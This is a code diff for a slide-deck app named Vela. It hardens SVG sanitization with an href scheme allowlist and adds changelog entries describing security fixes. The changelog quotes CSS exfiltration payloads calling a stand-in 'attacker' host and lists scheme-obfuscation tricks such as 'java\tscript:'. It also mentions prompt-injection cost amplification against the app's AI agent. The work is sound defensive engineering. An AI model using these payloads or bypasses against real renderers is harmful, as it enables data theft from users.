@@ -69,9 +69,10 @@ const velaClipboardReadSlide = async () => {
   return null;
 };
 
-const VELA_VERSION = "12.51";
+const VELA_VERSION = "12.52";
 const VELA_CHANGELOG = [
-  { v: "12.51", d: "Security (audit 2026-06, Low/defense-in-depth): close CSS-text exfil channel inside SVG. Before: <style> CSS text and <link rel=stylesheet> passed the element-only walk untouched, so `<style>* { background: url('https://attacker/?d=...') }</style>` (or @import) fired an outbound GET on render — zero-click beacon, no CSP backstop inside the artifact srcdoc. Not XSS (no script execution, sandboxed iframe), but still a confirmable render beacon and a slow CSS-attribute-exfil primitive. SAFE_STYLE_KEYS only covers `style=\"...\"` inline attributes. Fix: (1) <link> goes into SVG_BLOCKED_TAGS outright (no legitimate inline-SVG use). (2) <style> stays — Mermaid/draw.io/Vera-generated diagrams legitimately use inner CSS for class-driven styling and url(#fragment) paint-server/marker/gradient refs — but its textContent is filtered by isSvgStyleSafe(): reject @import, expression(), behavior:, -moz-binding, any backslash (CSS \XX escapes can decode 'url'/'@import' past a literal-token check), and any url() that isn't a same-document #fragment ref. Preserves legitimate class-based SVG styling; kills the exfil." },
+  { v: "12.52", d: "Security (audit 2026-06, Low/defense-in-depth): close CSS-text exfil channel inside SVG. Before: <style> CSS text and <link rel=stylesheet> passed the element-only walk untouched, so `<style>* { background: url('https://attacker/?d=...') }</style>` (or @import) fired an outbound GET on render — zero-click beacon, no CSP backstop inside the artifact srcdoc. Not XSS (no script execution, sandboxed iframe), but still a confirmable render beacon and a slow CSS-attribute-exfil primitive. SAFE_STYLE_KEYS only covers `style=\"...\"` inline attributes. Fix: (1) <link> goes into SVG_BLOCKED_TAGS outright (no legitimate inline-SVG use). (2) <style> stays — Mermaid/draw.io/Vera-generated diagrams legitimately use inner CSS for class-driven styling and url(#fragment) paint-server/marker/gradient refs — but its textContent is filtered by isSvgStyleSafe(): reject @import, expression(), behavior:, -moz-binding, any backslash (CSS \XX escapes can decode 'url'/'@import' past a literal-token check), and any url() that isn't a same-document #fragment ref. Preserves legitimate class-based SVG styling; kills the exfil." },
+  { v: "12.51", d: "Security (defense-in-depth, follow-up to v12.44/12.45): SVG href validation tightened from blocklist to allowlist after DOMParser normalization — only http/https/mailto/tel schemes (plus #fragment and scheme-less relatives) survive. Blocklist alone allowed file:, blob:, chrome:, intent:, ws: and other unexpected protocols through; only javascript:/data:/vbscript: were stripped. xlink:href remains restricted to local fragments. Mixed-case schemes (JaVaScRiPt:, JAVASCRIPT:) and entity-encoded schemes (already covered by the parser) now have explicit regression tests at both layers. Allowlisted schemes are covered by a regression guard so the tightening doesn't strip legitimate links." },
   { v: "12.50", d: "Security (audit 2025-05 — Critical/High hardening): (H1) LOAD_LANES reducer now re-sanitizes every slide via sanitizeSlide — Vera's 20-tool ReAct writes (set_slides/add_slide/edit_slide) round-trip through LOAD_LANES, the only ingest path that previously skipped sanitization. (H2) New sanitizeStyle() + SAFE_STYLE_KEYS allowlist: block.style and item.style were typecheck-only, allowing `backgroundImage: url('https://attacker/?d=...')` as a zero-click CSS exfil channel with no CSP backstop inside the artifact srcdoc. Allowlist excludes image-loading keys (background, backgroundImage, borderImage, listStyleImage, cursor, content, mask, filter, font shorthand) and rejects any value containing url()/expression()/image-set()/CSS-escape/angle-bracket even when the key is allowlisted. (H5) ReAct loop now caps tool_calls/turn (16), session-total tools (40), and cumulative messages payload (200 KB) to prevent prompt-injection cost-amplification DoS." },
   { v: "12.49", d: "Tests: complete XSS/deck-load regression coverage. Added 10 CI-gating source assertions (SVG_BLOCKED_TAGS + SMIL family, CDATA/comment node strip, control-char scheme normalization, lane clamp-not-throw, fail-closed deck-load fallbacks, IMPORT_CONCEPTS sanitizeSlide, openExternalLink sink + no raw window.open of deck links, item-level link sanitization) and new in-browser uitest cases (entity-encoded javascript: schemes, tag reconstruction, unclosed iframe/embed/script/foreignObject, vbscript via xlink:href, and a Deck Sanitization suite covering >50-lane clamp + non-whitelisted block drop)." },
   { v: "12.48", d: "Security (defense-in-depth): block the full SMIL animation family in SVG_BLOCKED_TAGS — added animateTransform, animateMotion, animateColor and mpath alongside the existing animate/set. Their on* event handlers were already stripped (so they were inert, not exploitable), but removing the elements outright eliminates any residual SMIL animation surface (e.g. animating an attribute toward a dangerous value) and matches the treatment of <animate>. Static presentation diagrams don't use SMIL." },
@@ -398,6 +399,21 @@ function sanitizeSvgMarkup(raw) {
           for (const a of attrs) {
             const name = a.name.toLowerCase();
             if (name.startsWith("on")) { child.removeAttribute(a.name); continue; }
+            // SECURITY: href/xlink:href are ALLOWLIST after DOMParser normalization.
+            // Entities (&#x3a;, &#58;, &#115;) are already decoded by the parser; we strip
+            // ASCII control/whitespace (browsers ignore them inside a scheme — "java\tscript:"
+            // is "javascript:"), then check via fixed allowlists. Mixed-case is folded by
+            // toLowerCase(). Blocklist alone would let file:, blob:, chrome:, intent:, etc.
+            if (name === "href" || name === "xlink:href") {
+              const norm = a.value.replace(/[\u0000-\u0020]+/g, "");
+              const lower = norm.toLowerCase();
+              if (name === "xlink:href") {
+                if (!lower.startsWith("#")) { child.removeAttribute(a.name); continue; }
+              } else {
+                const m = norm.match(/^([a-z][a-z0-9+\-.]*):/i);
+                if (m && !["http", "https", "mailto", "tel"].includes(m[1].toLowerCase())) { child.removeAttribute(a.name); continue; }
+              }
+            }
             const val = a.value.trim().toLowerCase();
             // Scheme check ignores ASCII whitespace/control chars (browsers strip tab/newline/CR inside URL schemes — "java\tscript:" === "javascript:")
             const scheme = a.value.replace(/[\u0000-\u0020]+/g, "").toLowerCase();
